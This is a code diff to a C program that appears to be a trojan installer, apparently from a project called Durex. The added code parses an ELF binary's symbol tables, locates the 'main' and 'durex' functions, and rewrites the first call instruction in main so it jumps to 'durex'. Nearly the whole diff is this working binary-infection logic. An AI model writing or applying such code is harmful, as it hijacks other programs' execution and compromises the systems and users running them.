@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/03 15:54:34 by root             ###   ########.fr       */
+/*   Updated: 2018/08/05 19:32:47 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,15 +31,14 @@ static int	install_error(int fd)
 	return 1;
 }
 
-static void	modify_binary(void *data, int size)
+static void	modify_binary(void *data)
 {
 	Elf64_Ehdr	*hdr = (Elf64_Ehdr *)data;
 	Elf64_Shdr	*shd = (Elf64_Shdr *)(data + hdr->e_shoff);
+	Elf64_Off	mainoff;
+	Elf64_Off	durexoff;
 
 	for (size_t i = 0; i < hdr->e_shnum; i++) {
-//		Elf64_Shdr	*shdr = section_header_table + i;
-//		char		*name = (string_table) ? string_table + shdr->sh_name : NULL;
-
 		if (shd[i].sh_type == SHT_SYMTAB || shd[i].sh_type == SHT_DYNSYM) {
 			Elf64_Shdr	*symbol_assoc = shd + shd[i].sh_link;
 			char		*symbol_table = (char *)data + symbol_assoc->sh_offset;
@@ -49,15 +48,21 @@ static void	modify_binary(void *data, int size)
 			for (size_t j = 0; j < shd[i].sh_size / shd[i].sh_entsize; j++) {
 				char	*sname = symbol_table + symbol->st_name;
 
-				if (!strcmp(sname, "main") || !strcmp(sname, "durex")) {
-					printf("%lx %lx %s\n", symbol->st_value, sname);
-				}
+				if (!strcmp(sname, "main"))
+					mainoff = symbol->st_value;
+				else if (!strcmp(sname, "durex"))
+					durexoff = symbol->st_value;
 				symbol_addr += shd[i].sh_entsize;
 				symbol = (Elf64_Sym *)symbol_addr;
 			}
 		}
 	}
-	(void)size;
+	u_char		*ptr = (u_char *)(data + mainoff); // Begining of "main"
+	int			off = 5; // opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
+	while (*ptr++ != 0xe8)  // Call opcode
+		off++;
+	off = durexoff - ( mainoff + off);
+	memcpy(ptr, &off, 4);
 }
 
 int			install_binary(const char *prog)
@@ -77,7 +82,7 @@ int			install_binary(const char *prog)
 	close(durex);
 	if (size == -1 || data == MAP_FAILED)
 		return install_error(bin);
-	modify_binary(data, size);
+	modify_binary(data);
 	durex = write(bin, data, size);
 	close(bin);
 	munmap(data, size);
